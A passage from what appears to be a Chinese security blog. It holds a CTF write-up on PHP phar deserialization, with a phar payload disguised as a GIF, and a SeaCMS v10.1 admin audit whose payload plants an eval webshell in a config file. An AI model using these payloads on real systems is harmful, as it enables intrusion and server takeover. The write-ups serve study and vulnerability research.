class="variable">$hostname</span>=<span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    public <span class="variable">$dbuser</span>=<span class="string">&quot;p3rh4ps&quot;</span>;</span><br><span class="line">    public <span class="variable">$dbpass</span>=<span class="string">&quot;p3rh4ps&quot;</span>;</span><br><span class="line">    public <span class="variable">$database</span>=<span class="string">&quot;p3rh4ps&quot;</span>;</span><br><span class="line">    public <span class="variable">$name</span>;</span><br><span class="line">    public <span class="variable">$password</span>;</span><br><span class="line">    public <span class="variable">$mysqli</span>;</span><br><span class="line">    public <span class="variable">$token</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;name=<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable">$this</span>-&gt;password=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> login()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;mysqli=new mysqli(<span class="variable">$this</span>-&gt;hostname, <span class="variable">$this</span>-&gt;dbuser, <span class="variable">$this</span>-&gt;dbpass, <span class="variable">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            die(<span class="string">&quot;连接失败，错误:&quot;</span> . <span class="variable">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$sql</span>=<span class="string">&quot;select id,password from users where username=?&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span>=<span class="variable">$this</span>-&gt;mysqli-&gt;prepare(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$result</span>-&gt;bind_param(<span class="string">&#x27;s&#x27;</span>, <span class="variable">$this</span>-&gt;name);</span><br><span class="line">        <span class="variable">$result</span>-&gt;execute();</span><br><span class="line">        <span class="variable">$result</span>-&gt;bind_result(<span class="variable">$idResult</span>, <span class="variable">$passwordResult</span>);</span><br><span class="line">        <span class="variable">$result</span>-&gt;fetch();</span><br><span class="line">        <span class="variable">$result</span>-&gt;close();</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$this</span>-&gt;token==<span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="built_in">return</span> <span class="variable">$idResult</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$idResult</span>) &#123;</span><br><span class="line">            <span class="built_in">echo</span>(<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (md5(<span class="variable">$this</span>-&gt;password)!==<span class="variable">$passwordResult</span>) &#123;</span><br><span class="line">            <span class="built_in">echo</span>(<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">            <span class="built_in">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>]=<span class="variable">$this</span>-&gt;name;</span><br><span class="line">        <span class="built_in">return</span> <span class="variable">$idResult</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> <span class="function"><span class="title">__destruct</span></span>()&#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$this</span>-&gt;token;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Class Upload&#123;</span><br><span class="line">    public <span class="variable">$flag</span>;</span><br><span class="line">    public <span class="variable">$file</span>;</span><br><span class="line">    public <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__construct</span></span>()&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;flag = 1;</span><br><span class="line">        <span class="variable">$this</span>-&gt;black_list = [<span class="string">&#x27;ph&#x27;</span>, <span class="string">&#x27;ht&#x27;</span>, <span class="string">&#x27;sh&#x27;</span>, <span class="string">&#x27;pe&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;co&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;\&#x27;&quot;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">check</span></span>()&#123;</span><br><span class="line">        <span class="variable">$ext</span> = substr(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], strpos(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>], <span class="string">&#x27;.&#x27;</span>));</span><br><span class="line">        <span class="variable">$reg</span>=implode(<span class="string">&quot;|&quot;</span>,<span class="variable">$this</span>-&gt;black_list);</span><br><span class="line">        <span class="variable">$reg</span> = <span class="string">&quot;/&quot;</span> . <span class="variable">$reg</span> . <span class="string">&quot;\x|\s|[\x01-\x20]/i&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="variable">$reg</span>, <span class="variable">$ext</span>))&#123;</span><br><span class="line">            <span class="variable">$this</span>-&gt;flag = 0;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$this</span>-&gt;ext = <span class="variable">$ext</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">__wakeup</span></span>()&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;flag = 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="function"><span class="title">upload</span></span>()&#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;file = <span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="variable">$this</span>-&gt;check();</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$this</span>-&gt;flag)&#123;</span><br><span class="line">            <span class="keyword">if</span>(isset(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; 0)&#123;</span><br><span class="line">                    <span class="built_in">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>];</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span>&#123;</span><br><span class="line">                    <span class="keyword">if</span> (file_exists(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">                        <span class="built_in">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span>&#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] &gt; 10240)&#123;</span><br><span class="line">                            <span class="built_in">echo</span> <span class="string">&quot;too big&quot;</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">else</span>&#123;</span><br><span class="line">                            <span class="variable">$new_addr</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>] . <span class="string">&quot;/upload/&quot;</span> . md5(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>]) . <span class="variable">$this</span>-&gt;ext;</span><br><span class="line">                            <span class="built_in">echo</span> <span class="variable">$new_addr</span>;</span><br><span class="line">                            move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="variable">$new_addr</span>);</span><br><span class="line">                            <span class="built_in">return</span> <span class="variable">$new_addr</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">&quot;Noooooooooooooooooooooooooooo!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Class Reader&#123;</span><br><span class="line">    public <span class="variable">$filename</span>;</span><br><span class="line">    public <span class="variable">$result</span>;</span><br><span class="line">    public <span class="keyword">function</span> <span class="built_in">read</span>(<span class="variable">$filename</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/flag/i&quot;</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line">            die(<span class="string">&quot;想多了嗷&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/sh/i&quot;</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line">            die(<span class="string">&quot;nooooooooooo!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&quot;/^php|^file|^gopher|^http|^https|^ftp|^data|^phar|^smtp|^dict|^zip/i&quot;</span>,<span class="variable">$filename</span>))&#123;</span><br><span class="line">            die(<span class="string">&quot;Invid Schema!&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">echo</span> file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    public <span class="keyword">function</span> __set(<span class="variable">$name</span>,<span class="variable">$val</span>)&#123;</span><br><span class="line">        <span class="built_in">echo</span> file_get_contents(<span class="variable">$val</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>构造payload</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">class User</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$id</span>;</span><br><span class="line">    public <span class="variable">$age</span>=null;</span><br><span class="line">    public <span class="variable">$nickname</span>=null;</span><br><span class="line">    public <span class="variable">$backup</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;nickname=new Reader();</span><br><span class="line">        <span class="variable">$this</span>-&gt;backup=<span class="string">&#x27;/flag.txt&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class dbCtrl</span><br><span class="line">&#123;</span><br><span class="line">    public <span class="variable">$token</span>;</span><br><span class="line">    public <span class="keyword">function</span> __construct()</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$this</span>-&gt;token=new User;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">Class Reader&#123;</span><br><span class="line">    public <span class="variable">$filename</span>;</span><br><span class="line">    public <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$lh</span> = new dbCtrl();</span><br><span class="line"><span class="variable">$phar</span> = new Phar(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;GIF89a&quot;</span>.<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$lh</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line">@rename(<span class="string">&quot;phar.phar&quot;</span>,<span class="string">&quot;lh.gif&quot;</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>得到phar文件，改为gif文件上传得到路径<br><img src="/images/web/phar9.png" alt="direct"><br>然后在read页面进行读取，因为读文件时对schema有过滤，利用压缩过滤器触发phar即可：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">compress.zlib://phar:///var/www/html2/upload/1b33718042e7dfe8fac079be96ebc4d9.gif</span><br></pre></td></tr></table></figure>
<p>成功读取根目录下flag.txt文件的内容<br><img src="/images/web/phar10.png" alt="direct"><br><img src="/images/web/phar11.png" alt="direct"></p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>Seacms v10.1 后台getshell</title>
    <url>/2020/10/22/Seacms-v10-1-%E5%90%8E%E5%8F%B0getshell/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="SeaCMS-v10-1代码审计实战"><a href="#SeaCMS-v10-1代码审计实战" class="headerlink" title="SeaCMS v10.1代码审计实战"></a>SeaCMS v10.1代码审计实战</h1><h2 id="后台命令执行（一）"><a href="#后台命令执行（一）" class="headerlink" title="后台命令执行（一）"></a>后台命令执行（一）</h2><p>在pjsxwk/admin_ip.php下第五行使用set参数<br>原文代码块如下所示</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&quot;set&quot;</span>)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="variable">$v</span>= <span class="variable">$_POST</span>[<span class="string">&#x27;v&#x27;</span>];</span><br><span class="line">	<span class="variable">$ip</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ip&#x27;</span>];</span><br><span class="line">	<span class="variable">$open</span>=fopen(<span class="string">&quot;../data/admin/ip.php&quot;</span>,<span class="string">&quot;w&quot;</span> );</span><br><span class="line">	<span class="variable">$str</span>=<span class="string">&#x27;&lt;?php &#x27;</span>;</span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;$v = &quot;&#x27;</span>;</span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&quot;<span class="variable">$v</span>&quot;</span>;</span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;&quot;; &#x27;</span>;</span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;$ip = &quot;&#x27;</span>;</span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&quot;<span class="variable">$ip</span>&quot;</span>;</span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;&quot;; &#x27;</span>;</span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&quot; ?&gt;&quot;</span>;</span><br><span class="line">	fwrite(<span class="variable">$open</span>,<span class="variable">$str</span>);</span><br><span class="line">	fclose(<span class="variable">$open</span>);</span><br><span class="line">	ShowMsg(<span class="string">&quot;成功保存设置!&quot;</span>,<span class="string">&quot;admin_ip.php&quot;</span>);</span><br><span class="line">	<span class="built_in">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>\data\admin\ip.php的文件内容为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php <span class="variable">$v</span> = <span class="string">&quot;0&quot;</span>; <span class="variable">$ip</span> = <span class="string">&quot; &quot;</span>;  ?&gt;</span><br></pre></td></tr></table></figure>

<p>对用户输入没有进行任何处理，直接写入文件<br>于是构造payload<br>抓包POST后显示 在传参点改为</p>
<p><img src="/images/fx/Seacms/3.png" alt="direct"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">v=0&amp;ip=+asdadasdasd<span class="string">&quot;;@eval(<span class="variable">$_POST</span>[&quot;</span>lh<span class="string">&quot;]);//</span></span><br></pre></td></tr></table></figure>
<p>再次访问\data\admin\ip.php 文件变成</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php <span class="variable">$v</span> = <span class="string">&quot;0&quot;</span>; <span class="variable">$ip</span> = <span class="string">&quot; asdadasdasd&quot;</span>;@<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;lh&quot;</span>]);//<span class="string">&quot;;  ?&gt;</span></span><br></pre></td></tr></table></figure>
<p>于是菜刀连接</p>
<p><img src="/images/fx/Seacms/4.png" alt="direct"></p>
<h2 id="后台命令执行（二）"><a href="#后台命令执行（二）" class="headerlink" title="后台命令执行（二）"></a>后台命令执行（二）</h2><p>在pjsxwk/admin_weixin.php下第五行，使用set参数<br>对传入参数没有进行处理，拼接字符串</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;Content-Type:text/html;charset=utf-8&#x27;</span>);</span><br><span class="line"></span><br><span class="line">require_once(dirname(__FILE__).<span class="string">&quot;/config.php&quot;</span>);</span><br><span class="line"></span><br><span class="line">CheckPurview();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$action</span>==<span class="string">&quot;set&quot;</span>)</span><br><span class="line"></span><br><span class="line">&#123;	</span><br><span class="line"></span><br><span class="line">	<span class="variable">$isopen</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;isopen&#x27;</span>];</span><br><span class="line"></span><br><span class="line">	<span class="variable">$title</span> = htmlspecialchars(<span class="variable">$_POST</span>[<span class="string">&#x27;title&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"></span><br><span class="line">	<span class="variable">$ckmov_url</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ckmov_url&#x27;</span>];</span><br><span class="line"></span><br><span class="line">	<span class="variable">$follow</span> = htmlspecialchars(<span class="variable">$_POST</span>[<span class="string">&#x27;follow&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$noc</span> = htmlspecialchars(<span class="variable">$_POST</span>[<span class="string">&#x27;noc&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$dpic</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;dpic&#x27;</span>];</span><br><span class="line"></span><br><span class="line">	<span class="variable">$help</span> = htmlspecialchars(<span class="variable">$_POST</span>[<span class="string">&#x27;help&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$topage</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;topage&#x27;</span>];</span><br><span class="line"></span><br><span class="line">	<span class="variable">$sql_num</span> = intval(<span class="variable">$_POST</span>[<span class="string">&#x27;sql_num&#x27;</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$dwz</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;dwz&#x27;</span>];</span><br><span class="line"></span><br><span class="line">	<span class="variable">$dwztoken</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;dwztoken&#x27;</span>];</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="variable">$msg1a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;msg1a&#x27;</span>];</span><br><span class="line"></span><br><span class="line">	<span class="variable">$msg1b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;msg1b&#x27;</span>];</span><br><span class="line"></span><br><span class="line">	<span class="variable">$msg2a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;msg2a&#x27;</span>];</span><br><span class="line"></span><br><span class="line">	<span class="variable">$msg2b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;msg2b&#x27;</span>];</span><br><span class="line"></span><br><span class="line">	<span class="variable">$msg3a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;msg3a&#x27;</span>];</span><br><span class="line"></span><br><span class="line">	<span class="variable">$msg3b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;msg3b&#x27;</span>];</span><br><span class="line"></span><br><span class="line">	<span class="variable">$msg4a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;msg4a&#x27;</span>];</span><br><span class="line"></span><br><span class="line">	<span class="variable">$msg4b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;msg4b&#x27;</span>];</span><br><span class="line"></span><br><span class="line">	<span class="variable">$msg5a</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;msg5a&#x27;</span>];</span><br><span class="line"></span><br><span class="line">	<span class="variable">$msg5b</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;msg5b&#x27;</span>];</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="variable">$open</span>=fopen(<span class="string">&quot;../data/admin/weixin.php&quot;</span>,<span class="string">&quot;w&quot;</span> );</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>=<span class="string">&#x27;&lt;?php &#x27;</span>;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;define(&quot;isopen&quot;, &quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&quot;<span class="variable">$isopen</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;&quot;); &#x27;</span>;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;define(&quot;title&quot;, &quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&quot;<span class="variable">$title</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;&quot;); &#x27;</span>;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;define(&quot;url&quot;, &quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&quot;<span class="variable">$url</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;&quot;); &#x27;</span>;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;define(&quot;ckmov_url&quot;, &quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&quot;<span class="variable">$ckmov_url</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;&quot;); &#x27;</span>;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;define(&quot;follow&quot;, &quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&quot;<span class="variable">$follow</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;&quot;); &#x27;</span>;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;define(&quot;noc&quot;, &quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&quot;<span class="variable">$noc</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;&quot;); &#x27;</span>;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;define(&quot;dpic&quot;, &quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&quot;<span class="variable">$dpic</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;&quot;); &#x27;</span>;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;define(&quot;help&quot;, &quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&quot;<span class="variable">$help</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;&quot;); &#x27;</span>;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;define(&quot;topage&quot;, &quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&quot;<span class="variable">$topage</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;&quot;); &#x27;</span>;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;define(&quot;dwz&quot;, &quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&quot;<span class="variable">$dwz</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;&quot;); &#x27;</span>;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;define(&quot;dwztoken&quot;, &quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&quot;<span class="variable">$dwztoken</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;&quot;); &#x27;</span>;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;define(&quot;sql_num&quot;, &quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&quot;<span class="variable">$sql_num</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;&quot;); &#x27;</span>;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;define(&quot;msg1a&quot;, &quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&quot;<span class="variable">$msg1a</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;&quot;); &#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;define(&quot;msg1b&quot;, &quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&quot;<span class="variable">$msg1b</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;&quot;); &#x27;</span>;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;define(&quot;msg2a&quot;, &quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&quot;<span class="variable">$msg2a</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;&quot;); &#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;define(&quot;msg2b&quot;, &quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&quot;<span class="variable">$msg2b</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;&quot;); &#x27;</span>;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;define(&quot;msg3a&quot;, &quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&quot;<span class="variable">$msg3a</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;&quot;); &#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;define(&quot;msg3b&quot;, &quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&quot;<span class="variable">$msg3b</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;&quot;); &#x27;</span>;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;define(&quot;msg4a&quot;, &quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&quot;<span class="variable">$msg4a</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;&quot;); &#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="variable">$str</span>.=<span class="string">&#x27;define(&quot;msg4b&quot;, &quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	